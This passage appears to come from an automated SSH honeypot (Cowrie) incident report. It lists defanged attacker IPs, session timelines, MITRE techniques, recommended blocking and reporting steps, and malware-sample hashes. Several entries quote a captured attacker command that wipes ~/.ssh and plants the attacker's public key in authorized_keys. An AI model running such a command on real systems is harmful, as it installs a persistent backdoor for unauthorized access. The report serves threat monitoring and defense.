| `2026-05-24 07:14:51` | `cowrie.command.input` |
| `2026-05-24 07:14:51` | `cowrie.session.file_download` |
| `2026-05-24 07:14:51` | `cowrie.log.closed` |
| `2026-05-24 07:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.22.162[.]46` to AbuseIPDB if not already reported
- [ ] Block `125.22.162[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bb9accc4eda

| Field | Detail |
|---|---|
| **Source IP** | `125.22.162[.]46` |
| **First Seen** | 2026-05-24 07:14 |
| **Last Seen** | 2026-05-24 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:14:53` | `cowrie.session.connect` |
| `2026-05-24 07:14:53` | `cowrie.client.version` |
| `2026-05-24 07:14:53` | `cowrie.client.kex` |
| `2026-05-24 07:14:53` | `cowrie.login.success` |
| `2026-05-24 07:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.22.162[.]46` to AbuseIPDB if not already reported
- [ ] Block `125.22.162[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b659551f894

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:21 |
| **Last Seen** | 2026-05-24 07:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:21:47` | `cowrie.session.connect` |
| `2026-05-24 07:21:47` | `cowrie.client.version` |
| `2026-05-24 07:21:47` | `cowrie.client.kex` |
| `2026-05-24 07:21:48` | `cowrie.login.success` |
| `2026-05-24 07:21:49` | `cowrie.session.params` |
| `2026-05-24 07:21:49` | `cowrie.command.input` |
| `2026-05-24 07:21:49` | `cowrie.command.failed` |
| `2026-05-24 07:21:49` | `cowrie.log.closed` |
| `2026-05-24 07:21:49` | `cowrie.session.params` |
| `2026-05-24 07:21:49` | `cowrie.command.input` |
| `2026-05-24 07:21:49` | `cowrie.session.file_download` |
| `2026-05-24 07:21:49` | `cowrie.log.closed` |
| `2026-05-24 07:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d89e039a43

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:21 |
| **Last Seen** | 2026-05-24 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:21:52` | `cowrie.session.connect` |
| `2026-05-24 07:21:52` | `cowrie.client.version` |
| `2026-05-24 07:21:52` | `cowrie.client.kex` |
| `2026-05-24 07:21:53` | `cowrie.login.success` |
| `2026-05-24 07:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dfbf588aa14

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:22 |
| **Last Seen** | 2026-05-24 07:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:22:02` | `cowrie.session.connect` |
| `2026-05-24 07:22:02` | `cowrie.client.version` |
| `2026-05-24 07:22:02` | `cowrie.client.kex` |
| `2026-05-24 07:22:03` | `cowrie.login.success` |
| `2026-05-24 07:22:03` | `cowrie.session.params` |
| `2026-05-24 07:22:03` | `cowrie.command.input` |
| `2026-05-24 07:22:03` | `cowrie.command.failed` |
| `2026-05-24 07:22:03` | `cowrie.log.closed` |
| `2026-05-24 07:22:04` | `cowrie.session.params` |
| `2026-05-24 07:22:04` | `cowrie.command.input` |
| `2026-05-24 07:22:04` | `cowrie.session.file_download` |
| `2026-05-24 07:22:04` | `cowrie.log.closed` |
| `2026-05-24 07:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e457927f61cc

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:22 |
| **Last Seen** | 2026-05-24 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:22:06` | `cowrie.session.connect` |
| `2026-05-24 07:22:06` | `cowrie.client.version` |
| `2026-05-24 07:22:07` | `cowrie.client.kex` |
| `2026-05-24 07:22:07` | `cowrie.login.success` |
| `2026-05-24 07:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ccc4b0c03c2

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:23 |
| **Last Seen** | 2026-05-24 07:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:23:08` | `cowrie.session.connect` |
| `2026-05-24 07:23:08` | `cowrie.client.version` |
| `2026-05-24 07:23:08` | `cowrie.client.kex` |
| `2026-05-24 07:23:09` | `cowrie.login.success` |
| `2026-05-24 07:23:09` | `cowrie.session.params` |
| `2026-05-24 07:23:09` | `cowrie.command.input` |
| `2026-05-24 07:23:09` | `cowrie.command.failed` |
| `2026-05-24 07:23:10` | `cowrie.log.closed` |
| `2026-05-24 07:23:10` | `cowrie.session.params` |
| `2026-05-24 07:23:10` | `cowrie.command.input` |
| `2026-05-24 07:23:10` | `cowrie.session.file_download` |
| `2026-05-24 07:23:10` | `cowrie.log.closed` |
| `2026-05-24 07:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ff7e60f457

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:23 |
| **Last Seen** | 2026-05-24 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:23:13` | `cowrie.session.connect` |
| `2026-05-24 07:23:13` | `cowrie.client.version` |
| `2026-05-24 07:23:13` | `cowrie.client.kex` |
| `2026-05-24 07:23:14` | `cowrie.login.success` |
| `2026-05-24 07:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d43d3d123c

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:23 |
| **Last Seen** | 2026-05-24 07:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:23:35` | `cowrie.session.connect` |
| `2026-05-24 07:23:35` | `cowrie.client.version` |
| `2026-05-24 07:23:36` | `cowrie.client.kex` |
| `2026-05-24 07:23:36` | `cowrie.login.success` |
| `2026-05-24 07:23:37` | `cowrie.session.params` |
| `2026-05-24 07:23:37` | `cowrie.command.input` |
| `2026-05-24 07:23:37` | `cowrie.command.failed` |
| `2026-05-24 07:23:37` | `cowrie.log.closed` |
| `2026-05-24 07:23:37` | `cowrie.session.params` |
| `2026-05-24 07:23:37` | `cowrie.command.input` |
| `2026-05-24 07:23:38` | `cowrie.session.file_download` |
| `2026-05-24 07:23:38` | `cowrie.log.closed` |
| `2026-05-24 07:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12891a1d3cb6

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:23 |
| **Last Seen** | 2026-05-24 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:23:40` | `cowrie.session.connect` |
| `2026-05-24 07:23:40` | `cowrie.client.version` |
| `2026-05-24 07:23:40` | `cowrie.client.kex` |
| `2026-05-24 07:23:41` | `cowrie.login.success` |
| `2026-05-24 07:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f9b351a86c5

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:24 |
| **Last Seen** | 2026-05-24 07:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:24:04` | `cowrie.session.connect` |
| `2026-05-24 07:24:04` | `cowrie.client.version` |
| `2026-05-24 07:24:04` | `cowrie.client.kex` |
| `2026-05-24 07:24:05` | `cowrie.login.success` |
| `2026-05-24 07:24:05` | `cowrie.session.params` |
| `2026-05-24 07:24:05` | `cowrie.command.input` |
| `2026-05-24 07:24:05` | `cowrie.command.failed` |
| `2026-05-24 07:24:06` | `cowrie.log.closed` |
| `2026-05-24 07:24:06` | `cowrie.session.params` |
| `2026-05-24 07:24:06` | `cowrie.command.input` |
| `2026-05-24 07:24:06` | `cowrie.session.file_download` |
| `2026-05-24 07:24:06` | `cowrie.log.closed` |
| `2026-05-24 07:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be1da1788957

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]198` |
| **First Seen** | 2026-05-24 07:24 |
| **Last Seen** | 2026-05-24 07:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:24:09` | `cowrie.session.connect` |
| `2026-05-24 07:24:09` | `cowrie.client.version` |
| `2026-05-24 07:24:09` | `cowrie.client.kex` |
| `2026-05-24 07:24:10` | `cowrie.login.success` |
| `2026-05-24 07:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e875265e93e8

| Field | Detail |
|---|---|
| **Source IP** | `101.96.202[.]48` |
| **First Seen** | 2026-05-24 07:25 |
| **Last Seen** | 2026-05-24 07:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:25:21` | `cowrie.session.connect` |
| `2026-05-24 07:25:22` | `cowrie.client.version` |
| `2026-05-24 07:25:22` | `cowrie.client.kex` |
| `2026-05-24 07:25:22` | `cowrie.login.success` |
| `2026-05-24 07:25:23` | `cowrie.session.params` |
| `2026-05-24 07:25:23` | `cowrie.command.input` |
| `2026-05-24 07:25:23` | `cowrie.command.failed` |
| `2026-05-24 07:25:23` | `cowrie.log.closed` |
| `2026-05-24 07:25:23` | `cowrie.session.params` |
| `2026-05-24 07:25:23` | `cowrie.command.input` |
| `2026-05-24 07:25:23` | `cowrie.session.file_download` |
| `2026-05-24 07:25:23` | `cowrie.log.closed` |
| `2026-05-24 07:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.202[.]48` to AbuseIPDB if not already reported
- [ ] Block `101.96.202[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c90bab79905c

| Field | Detail |
|---|---|
| **Source IP** | `101.96.202[.]48` |
| **First Seen** | 2026-05-24 07:25 |
| **Last Seen** | 2026-05-24 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:25:31` | `cowrie.session.connect` |
| `2026-05-24 07:25:32` | `cowrie.client.version` |
| `2026-05-24 07:25:32` | `cowrie.client.kex` |
| `2026-05-24 07:25:33` | `cowrie.login.success` |
| `2026-05-24 07:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.202[.]48` to AbuseIPDB if not already reported
- [ ] Block `101.96.202[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `168.197.99[.]122` | **147** | 2026-05-24 05:14 | 2026-05-24 05:41 | 75m | 0 | `T1592` | 🟠 MEDIUM |
| `59.103.108[.]151` | **25** | 2026-05-24 05:38 | 2026-05-24 05:43 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `113.249.112[.]97` | **16** | 2026-05-24 05:47 | 2026-05-24 06:33 | 26m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.76.120[.]198` | **15** | 2026-05-24 07:16 | 2026-05-24 07:24 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.130[.]213` | **15** | 2026-05-24 05:30 | 2026-05-24 05:46 | 18m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.147[.]62` | **10** | 2026-05-24 03:58 | 2026-05-24 03:59 | 0m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]213` | **10** | 2026-05-24 06:23 | 2026-05-24 07:02 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `168.228.192[.]190` | **8** | 2026-05-24 03:57 | 2026-05-24 04:07 | 16m | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | **6** | 2026-05-24 04:33 | 2026-05-24 07:21 | 5m | 0 | `T1592` | 🟢 LOW |
| `102.88.137[.]80` | **3** | 2026-05-24 06:55 | 2026-05-24 07:03 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `166.62.92[.]145` | **3** | 2026-05-24 05:43 | 2026-05-24 07:23 | 1m | 0 | `T1592` | 🟢 LOW |
| `125.141.139[.]31` | **2** | 2026-05-24 06:51 | 2026-05-24 06:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.184.182[.]87` | **2** | 2026-05-24 04:41 | 2026-05-24 04:43 | 4m | 0 | `T1592` | 🟢 LOW |
| `185.158.22[.]150` | **2** | 2026-05-24 04:37 | 2026-05-24 04:42 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]133` | **2** | 2026-05-24 05:08 | 2026-05-24 05:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.81[.]213` | 1 | 2026-05-24 06:19 | 2026-05-24 06:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]48` | 1 | 2026-05-24 07:25 | 2026-05-24 07:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `102.88.137[.]80` | 1 | 2026-05-24 04:50 | 2026-05-24 04:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.49.238[.]63` | 1 | 2026-05-24 04:06 | 2026-05-24 04:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.140.187[.]102` | 1 | 2026-05-24 04:05 | 2026-05-24 04:06 | 32s | 0 | `T1592` | 🟢 LOW |
| `112.18.182[.]202` | 1 | 2026-05-24 06:09 | 2026-05-24 06:10 | 61s | 0 | `T1592` | 🟢 LOW |
| `118.196.26[.]161` | 1 | 2026-05-24 06:23 | 2026-05-24 06:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.106[.]205` | 1 | 2026-05-24 04:33 | 2026-05-24 04:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.106[.]235` | 1 | 2026-05-24 04:05 | 2026-05-24 04:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.20[.]170` | 1 | 2026-05-24 04:21 | 2026-05-24 04:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.22.162[.]46` | 1 | 2026-05-24 07:14 | 2026-05-24 07:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `138.121.104[.]164` | 1 | 2026-05-24 06:16 | 2026-05-24 06:17 | 29s | 0 | `T1592` | 🟢 LOW |
| `154.83.12[.]172` | 1 | 2026-05-24 06:25 | 2026-05-24 06:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.169.100[.]182` | 1 | 2026-05-24 06:57 | 2026-05-24 06:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-05-24 06:14 | 2026-05-24 06:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.158.23[.]150` | 1 | 2026-05-24 04:35 | 2026-05-24 04:35 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.219.184[.]142` | 1 | 2026-05-24 04:11 | 2026-05-24 04:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `216.249.4[.]20` | 1 | 2026-05-24 06:53 | 2026-05-24 06:53 | 13s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-05-24 05:00 | 2026-05-24 05:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.40.145[.]110` | 1 | 2026-05-24 04:38 | 2026-05-24 04:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.121.179[.]100` | 1 | 2026-05-24 05:46 | 2026-05-24 05:46 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.78.202[.]217` | 1 | 2026-05-24 05:08 | 2026-05-24 05:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.231.206[.]109` | 1 | 2026-05-24 07:17 | 2026-05-24 07:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]3` | 1 | 2026-05-24 07:15 | 2026-05-24 07:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]8` | 1 | 2026-05-24 07:15 | 2026-05-24 07:15 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
